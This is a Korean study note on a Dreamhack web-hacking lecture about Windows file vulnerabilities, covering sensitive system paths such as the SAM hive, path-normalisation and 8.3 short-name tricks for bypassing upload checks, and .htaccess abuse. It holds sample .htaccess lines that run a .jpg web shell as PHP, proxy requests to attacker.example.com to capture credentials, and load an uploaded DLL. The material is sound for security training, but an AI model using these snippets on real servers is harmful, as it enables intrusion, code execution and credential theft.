# File Vulnerabilities for Windows

* 윈도우(Windows) 운영 체제의 특징
    - 기본적으로 마이크로소프트 Internet Information Services(IIS) Server 내장 웹 서버를 제공하고, 아파치 웹 서버와 nginx 등의 소프트웨어를 설치해 사용할 수 있음
    - 과거에 개발된 DOS 프로그램과 유닉스 운영 체제와의 호환성을 위해 다양한 경로 표기법이 존재함
        | 장점 (개발자 입장) | 단점 (공격자 입장) |
        |---|---|
        | 호환성과 유연한 서비스를 보장하는 프로그램을 개발할 수 있음 | 경로 표기 문자 검사를 우회하고 공격할 수 있음 |

<br/>

## Windows 파일 시스템
* 윈도우 파일 시스템의 특징
    - 리눅스와 달리 **드라이브**를 지정할 수 있음
        + 일반적으로 윈도우를 구성하고 애플리케이션 파일 등의 중요한 파일은 C 드라이브에 위치함
    - 파일 시스템 접근만으로 시스템 제어가 어려움
        + 유닉스 계열의 운영 체제와 윈도우 운영 체제의 비교
            | 종류 | 설명 |
            |---|-----|
            | 유닉스 계열의 운영 체제 | 대부분이 파일로 구성되어 있음 → **파일에 접근하는 것만으로도** 특정 기능을 수행할 수 있음 |
            | 윈도우 기반의 NT 아키텍처 | VMS 계열의 운영 체제에서 영향을 받았기 때문에 객체 지향 인터페이스를 사용함 <br/>&nbsp;&nbsp; → **기능에 알맞는 API를 사용**해야 함 |
    - 📚 참고: [윈도우 특수 폴더](https://docs.microsoft.com/en-us/windows/win32/shell/knownfolderid)

<br/>

### 윈도우 파일 시스템의 파일 종류
| 종류 | 설명 |
|---|------|
| 로그 및 데이터 파일 | 운영 체제 및 서비스의 로그와 각종 문서가 저장되는 위치 |
| 설정 파일 | 운영 체제 및 서비스를 구성하는 설정 파일 |
| 프로그램 및 라이브러리 | 프로그램의 명령어가 저장된 위치와 이들을 실행하기 위한 라이브러리의 위치 |
| 장치 및 가상 파일 | 운영 체제를 구성하기 위한 파일 |
| 임시 파일 | 운영 체제 및 서비스에서 사용하는 임시 디렉터리 |

<br/>

* 로그 및 데이터 파일
    | 디렉터리 | 설명 |
    |---|------|
    | C:\inetpub | IIS 서비스에서 웹 문서 및 기타 웹 서버에서 사용하는 파일을 저장함 |
    | C:\inetpub\wwwroot | IIS의 웹 문서가 저장되는 기본 경로 |
    | C:\ApacheXY\htdocs, <br/> C:\www | Apache Web Server에서 문서 경로로 흔히 사용되는 디렉터리 |
    | C:\Program Files | 각종 프로그램 및 데이터를 저장할 때 사용 <br/> &nbsp;&nbsp; - 데이터베이스 등이 여기에 속함 |
    | C:\ProgramData | 시스템의 각종 서비스에서 자료를 저장할 때 사용함 <br/> &nbsp;&nbsp; - 데이터베이스 등이 여기에 속함 |
    | C:\ProgramData\MySQL\MySQL Server X.Y\Data | MySQL 데이터베이스의 데이터가 일반적으로 여기에 저장됨 |
    | C:\ProgramData\PostgreSQL\X.Y\data | PostgreSQL 데이터베이스의 데이터가 일반적으로 여기에 저장됨 |
    | C:\Windows\System32\Winevt\Logs | 윈도 이벤트 로그를 저장할 때 사용함 |
    | C:\Windows\Prefetch | Superfetch 데이터를 저장함 <br/> &nbsp;&nbsp; - 최근 사용한 애플리케이션 목록 등을 조회할 수 있음 |

<br/>

* 설정 파일
    | 디렉터리 | 설명 |
    |---|------|
    | C:\Windows\System32\config | 시스템 단위 레지스트리 하이브 파일이 저장됨 |
    | C:\Boot | 부팅 관련 파일을 저장함 <br/> &nbsp;&nbsp; - EFI 기반 시스템에서는 EFI 시스템 파티션에 저장됨 |
    | %UserProfile%\Ntuser.dat |```%UserProfile%``` 프로필 디렉터리를 가진 사용자의 레지스트리가 저장됨 |
    | %UserProfile%\Local Settings\Application Data\Microsoft\Winodws\UsrClass.dat | ```%UserProfile%``` 프로필 디렉터리를 가진 사용자의 확장자 연결 정보 및 COM 클래스 등이 저장됨 |
    | C:\Windows\drivers\etc | ```hosts```, ```service```와 같은 네트워크 관련 설정 파일을 저장함 |
    | C:\Program Files\Apache Software Foundation\Apache<버전>\conf | Apache Web Server의 설정 정보를 저장함 |

    | 파일 | 설명 |
    |---|------|
    | C:\Boot\BCD | Boot Configuration Data 파일이 위치함 |
    | C:\ProgramData\MySQL\MySQL Server X.Y\my.ini | MySQL 데이터베이스 서버의 주 설정 파일 |
    | C:\Windows\System32\drivers\etc\hosts | 호스트네임의 실제 주소를 탐색할 때 사용되는 정적 순람표 |

<br/>

* 프로그램 및 라이브러리
    | 디렉터리 | 설명 |
    |---|------|
    | C:\Program Files | 각종 프로그램 및 데이터를 저장할 때 사용함 <br/> &nbsp;&nbsp; - 데이터베이스 등이 여기에 속함 |
    | C:\Windows\System32 | 시스템 파일 및 DLL들이 위치함 |
    | C:\Windows\SysWOW64 | 32비트 호환(Windows-on-Windows) 레이어 상 시스템 파일 및 DLL들이 위치함 |

<br/>

* 장치 밀 가상 파일
    | 디렉터리 | 설명 |
    |---|------|
    | \\\\.\ | Win32 장치 파일을 접근하는 경로의 시작을 나타냄 <br/> &nbsp;&nbsp; - ```NUL```, ```CON```과 같은 기본 장치 이름은 시스템 라이브러리에서 자동으로 인식됨 → ```\\.\```을 사용할 필요가 없음 |
    | \\\\?\ | NT 객체 관리자 하위체계(Object Manager Subsystem, Ob)의 객체 및 심볼릭 링크 등을 접근하는 경로의 시작을 나타냄 <br/> &nbsp;&nbsp; - 기본 경로는 ```\\.\```와 같음 |
    | \\\\?\GLOBALROOT\ | 실제 Object Manager의 최상위 경로를 접근하는 경로 |
    | \\\\?\GLOBALROOT\Device | NT 장치 객체를 포함하는 디렉터리 |
    | \??\ | ```\\?\```와 동일하게 사용 (와일드 카드 등의 문자가 다른 의미를 지니게 된다는 점에 주의) |
    | \\\\<호스트명>\<공유명>\ | 네트워크 상에 공유된 자원에 접근할 수 있는 UNC 경로를 나타냄 |

    | 장치 파일 | 설명 |
    |---|------|
    | NUL, CON, AUX, PRN, <br/>COM1, COM2, COM3, COM4, <br/>LPT1, LPT2, LPT3, LPT4 | 예약된(reserved) DOS 기본 장치 이름 <br/> &nbsp;&nbsp; - ```\\.\NUL```과 같이 사용할 수도 있음 (```\\.\``` 생략도 가능함) |
    | CON(```\\.\CON```) | 현재 콘솔 장치를 나타냄 |
    | CONIN$(```\\.\CONIN$```) | 현재 콘솔 입력 장치를 나타냄 |
    | CONOUT$(```\\.\CONOUT$```) | 현재 콘솔 출력 장치를 나타냄 |
    | \\\\?\GLOBALROOT\Device\HarddiskVolum\<N\> | 다른 드라이브를 선택할 때 ```C:\```와 같은 문법 대신 사용 가능 |

<br/>

* 임시 파일
    | 디렉터리 | 설명 |
    |---|------|
    | C:\Windows\Temp | 임시 파일을 저장함 |
    | %UserProfile%\AppData\Local\Temp | 일반적으로 사용자별 임시 팡리이 저장되는 경로 |

<br/><br/>

## 파일 업로드 공격
* 일반적으로 윈도우 웹 서버는 ```AUTHORITY\LocalService``` 또는 ```NTAUTHORITY\NetworkService``` 사용자 권한으로 실행됨
    - 웹 서비스가 높은 권한이 아닌 일반 권한으로 실행됨 → **파일 업로드 공격으로 인한 피해를 최소화할 수 있음**
    - 웹 서버의 파일 시스템 구조를 이해하고 있다면 일반 권한으로 덮어쓸 수 있는 파일을 덮어써서 임의 코드를 실행 할 수 있음

<br/>

### Apache Web Server: 일반 권한으로 임의 코드를 실행하는 방법
* 아파치 웹 서버의 설정 파일
    - 일반적으로 **C:\ApacheXY\htdocs** 또는 **C:\www** 디렉터리에서 관리함
    - 설정 파일 내에서 ```AccessFileName``` 지시어를 사용하면 설정 파일을 분산하여 관리할 수도 있음
        ```Apache
        AccessFileName filename [filename ...]
        ```
        + 기본값: [.htaccess](https://httpd.apache.org/docs/2.4/ko/howto/htaccess.html) 파일
            ```Apache
            AccessFileName .htaccess
            ```
            - ⚠️ **.htaccess 파일은 웹 서버의 권한만 있다면 덮어쓸 수 있음 → .htaccess 파일을 사용하는 웹 서버에서 파일 업로드 취약점 발생 시 다양한 공격 행위를 수행할 수 있음**
        + ```AccessFileName``` 지시어로 설정한 설정 파일에서 모든 설정을 변경할 수 있는 것은 아님
            - ```AllowOverride```와 ```AllowOverrideList``` 지시어를 통해 명시한 지시어만 사용할 수 있음 (참고: [AllowOverride Documentation](https://httpd.apache.org/docs/2.4/ko/mod/core.html#allowoverride))

* .htaccess 파일을 이용해 공격하는 방법
    - 웹 셸: ```.php``` 확장자 이외의 다른 확장자를 PHP 스크립트로 해석하도록 설정을 변경 (확장자 우회)
        + ```<Files>``` 섹션을 이용한 확장자 우회 예시 (참고: 📚 [Apache \<File\> Directive](https://sidoservice.seoul.go.kr/manual/ko/mod/core.html#files), 📚 [Apache Sections manual](https://sidoservice.seoul.go.kr/manual/ko/sections.html))
            ```Apache
            <Files "webshell-dreamhack.jpg">
                # php-fpm (PHP FastCGI Process Manager)을 사용하는 경우
                SetHandler "proxy:fcgi://locatlhost"
                # Apache2 자체 mod_php를 사용하는 경우
                SetHandler application/x-httpd-php
            </Files>
            ```
            - ```<Files>``` 섹션에 포함된 지시어들은 어떤 디렉토리에 있는지 관계없이 지정한 이름을 가진 파일에 적용됨
                + 위치와 관계 없이 "webshell-dreamhack.jpg"이란 이름을 가진 파일에 대한 요청이 들어오면 ```SetHandler```에 의해 명시된 핸들러가 처리함
    - 요청 리다이렉트: 모든 요청을 공격자의 웹 서버로 전달하도록 설정을 변경
        + 공격자 서버 리다이렉트 예시
            ```Apache
            RewriteEngine On
            RewriteOptions inherit # 부모의 설정을 상속받음 (inherit)

            # mod_proxy_fcgi를 사용하는 경우 FastCGI 서버로 요청 프록시
            RewriteRule (.*) fcgi://attacker.example.com.$1 [P]

            # mod_proxy_http를 사용하는 경우 HTTP 서버로 요청 프록시
            RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [P]

            # HTTP Redirect 적용
            RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [R=302, L]

            # 에러 페이지를 공격자의 웹 페이지로 리다이렉트함
            ErrorDocument 404 https://attacker.dreamhack
            ```
            - 사용한 지시어 설명
                | 지시어 | 설명 | 참고 |
                |---|-----|---|
                | RewriteEngine | Runtime Rewriting Engine을 활성화(On) 또는 비활성화(Off)함 | 📚 [RewriteEngine Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriteengine) |
                | RewriteOptions | 현재 서버별 또는 디렉토리별 구성에 대한 일부 특수 옵션을 설정함 (inherit, AllowAnyURI, MergeBase 중 하나만 될 수 있음) | 📚 [RewriteOptions Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriteoptions) | 
                | RewriteRule | Rewrite Engine에 대한 규칙을 정의함 <br/> &nbsp;&nbsp; - 형식: ```RewriteRule Pattern Substitution [flags]``` | 📚 [RewriteRule Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriterule) |
                | ErrorDocument | 문제/오류 발생 시 다음의 네 가지 중 하나를 수행하도록 함 <br/> &nbsp;&nbsp; - 하드코딩된 간단한 오류 메시지 출력 <br/> &nbsp;&nbsp; - 커스텀한 메시지 출력 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 내부적으로 로컬 URL 경로로 리다이렉션 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 외부 URL로 리다이렉션 | 📚 [ErrorDocument Directive](https://httpd.apache.org/docs/2.2/ko/mod/core.html#errordocument) |
        + 요청 중에 계정 정보를 포함한 민감한 정보가 포함되어 있다면 이를 또 다른 목적으로 사용할 수 있음
    - 공유 라이브러리: 사전에 업로드한 라이브러리 파일을 로드해 임의 코드를 실행할 수 있도록 설정을 변경
        + C:\www 디렉터리 내 파일들을 조작할 수 있어야 공격에 성공할 수 있음
        + 변경 사항을 웹 서버에 반영하기 위해서는 서비스 재시작이 필요함
        + 공유 라이브러리 로드 예시
            ```Apache
            # 서버가 재시작할 때 C:\www\path\injected\library.dll을 읽어들여 임의 코드를 실행함
            LoadFile "C:\www\path\injected\library.dll"
            ```
            - 사용한 지시어 설명
                | 지시어 | 설명 | 참고 |
                |---|------|---|
                | LoadFile | **서버가 시작하거나 재시작할 때** 지정한 목적 파일이나 라이브러리를 읽어들임(link in) <br/> &nbsp;&nbsp; - 형식: ```LoadFile filename [filename ...]``` | 📚 [LoadFile Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_so.html#loadfile) |

<br/>

> #### **Apache Web Server의 지시어 목록**
> 표준 아파치 배포판에서 사용 가능한 지시어의 목록은 [여기](https://httpd.apache.org/docs/2.2/ko/mod/directives.html#R)에 정리되어 있으며, 각 지시어를 클릭하면 상세 설명을 볼 수 있음

<br/>

### 파일 업로드 공격에서 이용할 수 있는 파일 목록
* 임의의 경로로 높은 권한을 획득했을 때 이용할 수 있는 시스템 파일
    | 파일 | 설명 |
    |---|------|
    | C:\Windows\System32\config\systemprofile | ```NT AUTHORITY\SYSTEM```의 사용자 프로필 계정 <br/> &nbsp;&nbsp; - Linux의 ```/root```에 대응됨 |
    | C:\Windows\System32\config\System <br/> C:\Windows\System32\config\System.alt <br/> C:\Windows\System32\config\System.log <br/> C:\Windows\System32\config\System.sav | ```HKEY_LOCAL_MACHINE\SYSTEM``` 레지스트리 키에 해당하는 하이브 파일 <br/> &nbsp;&nbsp; - 주요 시스템 설정 정보를 저장함 |
    | C:\Windows\System32\config\Software <br/> C:\Windows\System32\config\Software.log <br/> C:\Windows\System32\config\Software.sav | ```HKEY_LOCAL_MACHINE\SOFTWARE```레지스트리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 설치된 소프트웨어에서 사용됨 |
    | C:\Windows\System32\config\SAM <br/> C:\Windows\System32\config\SAM.log <br/> C:\Windows\System32\config\SAM.sav  | ```HKEY_LOCAL_MACHINE\SAM``` 레지스트리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 사용자 비밀번호 및 인증 정보 등을 저장함 <br/> &nbsp;&nbsp; - SAM: Security Account Manager의 약자 |
    | C:\Windows\System32\config\Security <br/> C:\Windows\System32\config\Security.alt <br/> C:\Windows\System32\config\Security.log <br/> C:\Windows\System32\config\Security.sav | ```HKEY_LOCAL_MACHINE\Security``` 레지스터리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 윈도우의 보안 데이터베이스를 저장함 |
    | C:\Windows\System32\config\Default <br/> C:\Windows\Sytsem32\config\Default.log <br/> C:\Windows\System32\config\Default.sav | ```HKEY_USERS\DEFAULT``` 레지스터리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 사용자별 레지스크리 키의 기본 구조를 지정함 |

* 일반 권한으로 접근할 수 있는 설정 파일
    | 파일 | 설명 |
    |---|------|
    | %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup | 현재 사용자의 시작 프로그램 목록이 저장됨 |
    | %ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\StartUp | 모든 로컬 사용자의 시작 프로그램 목록이 저장됨 |

<br/><br/>

## 윈도우 파일 및 경로
### 윈도우 파일명
* 파일명 뒷부분에 '.' 또는 스페이스 문자가 포함될 경우 이를 자동으로 제거함
    - EX: ```ShellL.php.. . . ...``` 파일명 → 운영 체제에서 ```Shell.php```로 해석 ('.' 문자와 스페이스 문자를 제거한 나머지만을 파일명으로 해석함) 
* 윈도우의 바탕이 되는 DOS 운영 체제
    - 파일명에 최대 8글자, 확장자를 최대 3 바이트까지 허용
    - '.' 문자를 허용하지 않았음
    - 파일명에 11바이트의 고정 버퍼를 사용함
        + EX: ```ALICE.H```의 경우 ```ALICE H ```로 표현함

<br/>

### 경로 변환
* **유닉스 계열의 운영 체제와의 호환성**을 위해 경로 구분 문자인 '/'를 '\\'로 변환함
    - 이를 이용한 경로 검사 우회 가능
        + 경로 변환이 적용된 예시
            | 경로 | 실제 경로 |
            |---|---|
            | C:/Windows | C:\Windows |
            | C:\htdocs\upload/foo/bar | C:\htdocs\uploads\foo\bar |
            | C:\htdocs\upload\bax/../../..Windows | C:\Windows (```..```은 상위 디렉터리를 의미) |
            | \\\\?\C:\htdocs\upload\qux\\../.. | \\\\?\C:\htdocs\upload\qux\\../.. |
            | \\\\?\C:\htdocs\upload\quux\\../../../ | \\\\?\C:\htdocs\upload\quux\\../../../ |
        +  ⚠️ ```"\\?\"``` 문자열로 시작하는 경로에 대해서는 경로 문자 변환이 이루어지지 않음에 주의

<br/><br/>

## 윈도우 경로 표기
### 드라이브 및 디바이스 경로
* 윈도우 운영 체제는 파일 경로를 다양하게 표현할 수 있음
    - 일반적으로 윈도우에서 파일 접근 시 사용하는 경로의 유형
        | 유형 | 형식 | 예시 |
        |----|----|--------|
        | 드라이브 상대 경로 | ```{드라이브 문자}:\{경로}``` | ```C:\Windows\system32\calc.exe``` <br/> ```C:\Users\user1\Documents\crackme\..\README.md``` <br/> ```F:\Media\Intro.mp4``` |
    - 상대 경로를 이용하는 방법 (리눅스와 유사함)
        | 유형 | 형식 | 예시 |
        |----|----|--------|
        | 드라이브 상대 경로 | ```{드라이브 문자}:{경로}``` | ```C:notes.txt``` <br/> ```C:Foo\bar.obj``` <br/> ```D:..\Test\other.doc``` |
        + 상대 경로 사용 시 ```\``` 문자를 포함하지 않고 다른 드라이브 파일에 접근할 수 있음
        + [DOS 프로그램과의 호환성] ```=C:```, ```=D:```와 같은 환경 변수를 통해 각각의 드라이브의 위치를 저장할 수 있음
            | 환경변수 | 예시 | 설명 |
            |------|---|---|
            | ```=D:``` 환경변수에 <br/>```D:\Apache2\Bin```이 저장 | ```D:httpd.exe``` 입력 | ```D:\Apache2\Bin\httpd.exe``` 파일에 접근함 |
            + 해당 환경 변수에 값이 할당되지 있지 않으면 드라이브의 최상위 경로를 가리킴
    - 특정 경로에 접근하기 위해 NT Object Manager 네임 스페이스 경로를 사용하는 방법
        | 유형 | 형식 |
        |----|----|
        | NT 객체 경로 | ```\\?\{객체 경로명}``` → 경로명 그대로 사용 <br/> ```\??\{객체 경로명}``` → ```..```와 같은 요소가 경로에 포함되어 있으면 자동 확장 처리되어 특수 파일명을 사용할 수 없음 |
        + 윈도우에서 미리 등록한 장치 및 드라이브의 예약어를 사용함
        + NT 객체 경로의 예시
            | 예시 | 설명 |
            |---|-----|
            | ```\\?\C:\Windows\system32``` | ```C:\Windows\system32``` 경로명을 그대로 사용함 <br/> &nbsp;&nbsp; - 드라이브의 절대 경로와 유사히지만 특수 문자 및 파일명을 사용할 수 있음 |
            |```\\?\GLOBALROOT\Device\HarddiskVolume1\C:\Windows\system32``` <br/> ```\??\GLOBALROOT\Device\HarddiskVolume1\C:\Windows\system32``` | 드라이브 대신에 볼륨명을 사용함 <br/> &nbsp;&nbsp; - ```\\?\GLOBALROOT\Device\HarddiskVolumne[N]```, ```\??\GLOBALROOT\Device\HarddiskVolumne[N]``` 구문으로 볼륨을 지정함 |
            | ```\\?\GLOBALROOT\SystemRoot``` <br/> ```\??\GLOBALROOT\SystemRoot``` | C:\Windows 디렉터리에 접근할 수 있음 |
            | ```\\?\127.0.0.1\c$\``` | 웹 서버에 네트워크 공유 서비스가 존재할 때 예시와 같이 내부 서비스를 이용한 파일 접근이 가능함 |
    - 그 외의 윈도우 운영 체제에서 사용하는 경로의 유형들
        | 유형 | 형식 | 예시 |
        |----|----|--------|
        | 드라이브 내 절대 경로 | ```\{경로명}``` | ```\Window\system32\calc.exe``` <br/> ```\Build\example\Lib\x86\..\Common\LfdType.h``` |
        | 드라이브 내 상대 경로 | ```{경로명}``` | ```Documents\desktop.ini``` <br/> ```..\..\..\..\Dir1\..\..\..\Users``` |
        | Win32 장치 경로 | ```\\.\{장치 경로명}``` | ```\\.\NULL``` <br/> ```\\.\CON``` <br/> ```\\.\PRN``` <br/> ```\\.\AUX``` <br/> ```\\.\COM1``` <br/> ```\\.\COM2``` <br/> ```\\.\COM3``` <br/> ```\\.\COM4``` <br/> ```\\.\LPT1``` <br/> ```\\.\LPT2``` <br/> ```\\.\LPT3``` <br/> ```\\.\LPT4``` <br/> ```\\.\PIPE\{파이프 명}``` (Windows NT Pipe 객체(IPC)) |
        | UNC 경로 | ```\\{서버}\{공유명}[\{경로}]``` <br/> ```\\?\UNC\{서버}\{공유명}[\{경로}]``` | ```\\smb.example.com\share``` <br/> = ```\\?\UNC\smb.example.com\share``` <br/> ```\\?\localhost\c$\Windows``` <br/> = ```\\?\UNC\localhost\c$\Windows``` |
* 윈도우에서 제공하는 다양한 파일 경로 유형들의 사용
    - 윈도우 애플리케이션에서 특정 장치에 접근해야 할 때 주로 사용함
    - 개발 목적 외에도 웹 애플리케이션의 타 디렉터리의 접근을 허용하지 않을 때 이를 우회하기 위한 목적으로 사용할 수 있음

<br/>

### DOC 8.3 파일명 
* DOS 8.3 파일명(8.3 Filename) = 짧은 파일명(Short Filename, SFN)
    - DOS 운영 체제의 파일명 → 8 바이트, 확장자 3 바이트를 포함해 최대 11 바이트 버퍼를 사용함
* 긴 파일명(Long Filename, LFN)
    - 윈도우 3.5부터 짧은 파일명의 제약을 없앤 긴 파일명을 지원함
    - 짧은 파일명을 호환하기 위해 긴 파일명에 **8.3 파일명 별칭**을 부여함
        - 예시
            | 긴 파일명 | 8.3 파일명 별칭 |
            |---|---|
            | webshell.phtml | WEBSHE1.PHT |
            | .htaccess | HTACCE~1 |
            | Web.config | WEB~1.CON |
        - 별칭이 붙는다는 특징을 이용해 확장자를 검사하는 애플리케이션의 로직을 우회하고 공격할 수 있음
        - 별칭의 생성을 막는 방법 - ```fsutil.exe 8dot3name``` 명령어를 이용
            - DOS 8.3 별칭에 의존하는 일부 프로그램에서 호환성 문제가 발생할 수 있기 때문에 사용하는 데 주의가 필요함
            - 📚 [fsuitl 사용법](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-8dot3name)
                ```windows
                fsutil 8dot3name [query] [<volumnepath>]
                ```
                + 지정한 디스크 볼륨에 대한 8.3 별칭 비활성화 동작을 쿼리함
* 윈도우의 별칭 부여 규칙
    1. 파일명은 대문자로만 이루어져야 함
        - 소문자는 모두 대문자로 자동 치환됨
    2. 스페이스, ASCII 제어 문자(```STX```, ```ESC``` 등) 및 ASCII 외 문자(확장 문자 집합이 활성회된 경우는 제외)는 모두 제거됨
    3. '+'와 같은 특수 문자는 밑줄('_') 문자로 치환됨
    4. 파일명과 확장자는 각각 8바이트와 3바이트 이하의 문자열로 이루어져야 하며, 각 요소 모두 '.' 문자를 포함할 수 없음
        - 고정 버퍼를 초과하는 파일의 변환
            | 긴 파일명 | 생성된 8.3 파일명 별칭 |
            |---|----|
            | Dreamhack.jpg | DREAMH~1.jpg |
            | Dreamhack.html | DREAMH~1.HTM |
    5. 첫 6바이트가 중복되는 파일이 생성되면 두 번째로 생성되는 파일의 ```~``` 문자 뒤의 숫자가 1 증가한 값으로 생성됨
        - 예시 (```DREAMH~1.jpg```가 생성되어 있는 경우)
            | 긴 파일명 | 생성된 8.3 파일명 별칭 |
            |---|----|
            | Dreamhill.jpg | DREAMH~2.jpg |
    6. 서로 동일한 6자리의 짧은 이름을 가진 네 개의 파일이나 폴더가 있을 때 파일명에 ```DRA4FE~1JPG```와 같은 해시값이 포함됨

<br/><br/><br/><br/>
### 🔖 출처
* [드림핵 Web Hacking Advanced - Server Side] 📌 [Background: File Vulnerabilities for Windows](https://dreamhack.io/lecture/courses/295)
